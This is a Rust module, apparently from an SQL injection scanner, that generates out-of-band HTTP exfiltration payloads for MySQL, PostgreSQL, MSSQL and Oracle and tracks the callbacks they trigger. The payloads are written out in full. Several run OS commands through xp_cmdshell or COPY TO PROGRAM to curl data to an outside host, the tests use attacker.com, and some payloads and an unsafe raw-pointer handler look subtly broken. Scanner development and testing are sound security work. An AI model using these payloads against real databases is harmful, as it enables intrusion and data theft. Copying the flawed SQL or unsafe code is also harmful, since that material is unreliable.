//! HTTP Exfiltration Probes for SQL Injection Detection
//! Implement HTTP exfiltration probes with bounded callback verification timeouts.

use std::collections::{HashMap, VecDeque};
use std::time::{Duration, Instant};

/// Maximum HTTP callbacks to track (bounded memory)
const MAX_HTTP_CALLBACKS: usize = 200;

/// Default timeout for HTTP callback verification
const HTTP_TIMEOUT_SECS: u64 = 30;

/// HTTP callback record
#[derive(Debug, Clone)]
pub struct HttpCallback {
    pub token: String,
    pub callback_url: String,
    pub created_at: Instant,
    pub received: bool,
    pub request_method: Option<String>,
    pub request_headers: Option<HashMap<String, String>>,
    pub request_body: Option<String>,
    pub source_ip: Option<String>,
}

/// HTTP exfiltration probe result
#[derive(Debug, Clone)]
pub struct HttpProbeResult {
    pub token: String,
    pub dbms_detected: Option<String>,
    pub exfiltrated_data: Option<String>,
    pub confidence: f64,
    pub response_time_ms: Option<u64>,
    pub callback_count: usize,
}

/// HTTP exfiltration probe manager
pub struct HttpExfiltrationProbe {
    callbacks: VecDeque<HttpCallback>,
    results: HashMap<String, HttpProbeResult>,
    timeout: Duration,
    callback_server_url: Option<String>,
    max_callbacks_per_token: usize,
}

impl HttpExfiltrationProbe {
    /// Create a new HTTP exfiltration probe
    pub fn new() -> Self {
        Self {
            callbacks: VecDeque::with_capacity(MAX_HTTP_CALLBACKS),
            results: HashMap::new(),
            timeout: Duration::from_secs(HTTP_TIMEOUT_SECS),
            callback_server_url: None,
            max_callbacks_per_token: 5,
        }
    }

    /// Set the callback server URL for receiving OOB callbacks
    pub fn set_callback_server(&mut self, url: &str) {
        self.callback_server_url = Some(url.to_string());
    }

    /// Set maximum callbacks to track per token
    pub fn set_max_callbacks_per_token(&mut self, max: usize) {
        self.max_callbacks_per_token = max.min(10); // Cap at 10
    }

    /// Generate a unique token for HTTP tracking
    pub fn generate_token() -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_millis();
        let random_suffix = rand::random::<u32>();
        format!("{}_{}", timestamp, random_suffix)
    }

    /// Build callback URL for a token
    pub fn build_callback_url(&self, token: &str) -> String {
        if let Some(ref server) = self.callback_server_url {
            format!("{}/callback/{}", server, token)
        } else {
            format!("http://interact.sh/callback/{}", token)
        }
    }

    /// Generate HTTP exfiltration payloads for different DBMS
    pub fn generate_payloads(&self, token: &str, param: &str) -> Vec<(String, String)> {
        let callback_url = self.build_callback_url(token);
        let mut payloads = Vec::new();

        // MySQL - LOAD_FILE via HTTP (requires secure_file_priv)
        payloads.push((
            "mysql_http".to_string(),
            format!(
                "{}' AND LOAD_FILE(CONCAT('{}', '/', (SELECT version())))-- ",
                param, callback_url
            ),
        ));

        // MySQL - INTO OUTFILE with curl/wget
        payloads.push((
            "mysql_system".to_string(),
            format!(
                "{}'; SELECT @@version INTO OUTFILE '/tmp/sqli.txt'; SYSTEM CONCAT('curl ', '{}?data=', @@version);-- ",
                param, callback_url
            ),
        ));

        // PostgreSQL - COPY TO PROGRAM with curl
        payloads.push((
            "postgres_program".to_string(),
            format!(
                "{}'; COPY (SELECT version()) TO PROGRAM 'curl \"{}?data=$(cat -)\"';-- ",
                param, callback_url
            ),
        ));

        // PostgreSQL - dblink with HTTP
        payloads.push((
            "postgres_dblink_http".to_string(),
            format!(
                "{}'; SELECT http_get('{}');-- ",
                param, callback_url
            ),
        ));

        // MSSQL - sp_OACreate with XMLHTTP
        payloads.push((
            "mssql_xmlhttp".to_string(),
            format!(
                "{}'; DECLARE @o INT; EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @o; EXEC sp_OAMethod @o, 'open', NULL, 'GET', '{}'; EXEC sp_OAMethod @o, 'send';-- ",
                param, callback_url
            ),
        ));

        // MSSQL - OLE Automation with WinHttp
        payloads.push((
            "mssql_winhttp".to_string(),
            format!(
                "{}'; DECLARE @o INT; EXEC sp_OACreate 'WinHttp.WinHttpRequest.5.1', @o; EXEC sp_OAMethod @o, 'Open', NULL, 'GET', '{}'; EXEC sp_OAMethod @o, 'Send';-- ",
                param, callback_url
            ),
        ));

        // Oracle - UTL_HTTP request
        payloads.push((
            "oracle_utl_http".to_string(),
            format!(
                "{}'; BEGIN UTL_HTTP.request('{}?data=' || (SELECT banner FROM v$version WHERE rownum=1)); END;-- ",
                param, callback_url
            ),
        ));

        // Oracle - HTTPURITYPE
        payloads.push((
            "oracle_httpuri".to_string(),
            format!(
                "{}'; SELECT HTTPURITYPE('{}').getclob() FROM dual;-- ",
                param, callback_url
            ),
        ));

        // Generic - Error-based with callback URL in error
        payloads.push((
            "generic_error".to_string(),
            format!(
                "{}' AND 1=CONVERT(int, (SELECT '{}' ))-- ",
                param, callback_url
            ),
        ));

        // Time-based with callback trigger
        payloads.push((
            "time_callback".to_string(),
            format!(
                "{}'; WAITFOR DELAY '0:0:2'; EXEC xp_cmdshell 'curl {}';-- ",
                param, callback_url
            ),
        ));

        payloads
    }

    /// Register an HTTP callback for tracking
    pub fn register_callback(&mut self, token: &str) -> String {
        let callback_url = self.build_callback_url(token);

        // Count existing callbacks for this token
        let existing_count = self.callbacks.iter().filter(|c| c.token == token).count();

        if existing_count >= self.max_callbacks_per_token {
            return callback_url; // Don't register more
        }

        let callback = HttpCallback {
            token: token.to_string(),
            callback_url: callback_url.clone(),
            created_at: Instant::now(),
            received: false,
            request_method: None,
            request_headers: None,
            request_body: None,
            source_ip: None,
        };

        // Maintain bounded storage
        if self.callbacks.len() >= MAX_HTTP_CALLBACKS {
            self.callbacks.pop_front();
        }

        self.callbacks.push_back(callback);
        callback_url
    }

    /// Record a received callback
    pub fn record_callback(
        &mut self,
        token: &str,
        method: &str,
        headers: Option<HashMap<String, String>>,
        body: Option<String>,
        source_ip: Option<String>,
    ) {
        for callback in self.callbacks.iter_mut().rev() {
            if callback.token == token && !callback.received {
                callback.received = true;
                callback.request_method = Some(method.to_string());
                callback.request_headers = headers;
                callback.request_body = body;
                callback.source_ip = source_ip;
                break;
            }
        }
    }

    /// Check if a callback was received for a token
    pub fn was_callback_received(&self, token: &str) -> bool {
        self.callbacks.iter().any(|c| c.token == token && c.received)
    }

    /// Get callback details for a token
    pub fn get_callback_details(&self, token: &str) -> Option<&HttpCallback> {
        self.callbacks.iter().find(|c| c.token == token && c.received)
    }

    /// Record a probe result
    pub fn record_result(&mut self, token: &str, result: HttpProbeResult) {
        if self.results.len() < MAX_HTTP_CALLBACKS / 2 {
            self.results.insert(token.to_string(), result);
        }
    }

    /// Get probe result for a token
    pub fn get_result(&self, token: &str) -> Option<&HttpProbeResult> {
        self.results.get(token)
    }

    /// Wait for callbacks with timeout
    pub async fn wait_for_callbacks(&self, token: &str, timeout_secs: u64) -> bool {
        let start = Instant::now();
        while start.elapsed().as_secs() < timeout_secs {
            if self.was_callback_received(token) {
                return true;
            }
            tokio::time::sleep(Duration::from_millis(500)).await;
        }
        false
    }

    /// Clean up expired callbacks
    pub fn cleanup_expired(&mut self) {
        let now = Instant::now();
        self.callbacks.retain(|c| now.duration_since(c.created_at) < self.timeout);
    }

    /// Get statistics about HTTP probing
    pub fn get_stats(&self) -> HttpProbeStats {
        let total_callbacks = self.callbacks.len();
        let received_callbacks = self.callbacks.iter().filter(|c| c.received).count();
        let pending_callbacks = total_callbacks - received_callbacks;

        HttpProbeStats {
            total_callbacks,
            received_callbacks,
            pending_callbacks,
            result_count: self.results.len(),
        }
    }

    /// Reset probe state
    pub fn reset(&mut self) {
        self.callbacks.clear();
        self.results.clear();
    }
}

impl Default for HttpExfiltrationProbe {
    fn default() -> Self {
        Self::new()
    }
}

/// Statistics about HTTP probing
#[derive(Debug, Clone)]
pub struct HttpProbeStats {
    pub total_callbacks: usize,
    pub received_callbacks: usize,
    pub pending_callbacks: usize,
    pub result_count: usize,
}

/// HTTP callback handler for receiving OOB callbacks
pub struct HttpCallbackHandler {
    probe: *mut HttpExfiltrationProbe,
    running: bool,
}

impl HttpCallbackHandler {
    /// Create a new callback handler
    pub fn new(probe: &mut HttpExfiltrationProbe) -> Self {
        Self {
            probe: probe as *mut HttpExfiltrationProbe,
            running: false,
        }
    }

    /// Start the callback handler server
    pub fn start(&mut self, port: u16) {
        self.running = true;
        // In production, would start an HTTP server on the given port
        // to receive callbacks and forward them to the probe
    }

    /// Stop the callback handler
    pub fn stop(&mut self) {
        self.running = false;
    }

    /// Process an incoming callback
    pub fn process_callback(
        &mut self,
        token: &str,
        method: &str,
        headers: HashMap<String, String>,
        body: Option<String>,
        source_ip: String,
    ) {
        unsafe {
            if let Some(probe) = self.probe.as_mut() {
                probe.record_callback(token, method, Some(headers), body, Some(source_ip));
            }
        }
    }

    /// Check if handler is running
    pub fn is_running(&self) -> bool {
        self.running
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_generation() {
        let mut probe = HttpExfiltrationProbe::new();
        probe.set_callback_server("http://attacker.com");

        let token = HttpExfiltrationProbe::generate_token();
        let payloads = probe.generate_payloads(&token, "id");

        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|(t, _)| t == "mssql_xmlhttp"));
        assert!(payloads.iter().any(|(t, _)| t == "oracle_utl_http"));
    }

    #[test]
    fn test_callback_tracking() {
        let mut probe = HttpExfiltrationProbe::new();
        let token = HttpExfiltrationProbe::generate_token();

        probe.register_callback(&token);
        assert!(!probe.was_callback_received(&token));

        probe.record_callback(&token, "GET", None, None, Some("1.2.3.4".to_string()));
        assert!(probe.was_callback_received(&token));
    }

    #[test]
    fn test_callback_url_building() {
        let mut probe = HttpExfiltrationProbe::new();
        probe.set_callback_server("http://attacker.com");

        let url = probe.build_callback_url("test123");
        assert!(url.contains("attacker.com"));
        assert!(url.contains("test123"));
    }

    #[test]
    fn test_probe_stats() {
        let mut probe = HttpExfiltrationProbe::new();
        let token = HttpExfiltrationProbe::generate_token();

        probe.register_callback(&token);
        probe.record_callback(&token, "POST", None, None, None);

        let stats = probe.get_stats();
        assert_eq!(stats.total_callbacks, 1);
        assert_eq!(stats.received_callbacks, 1);
    }
}
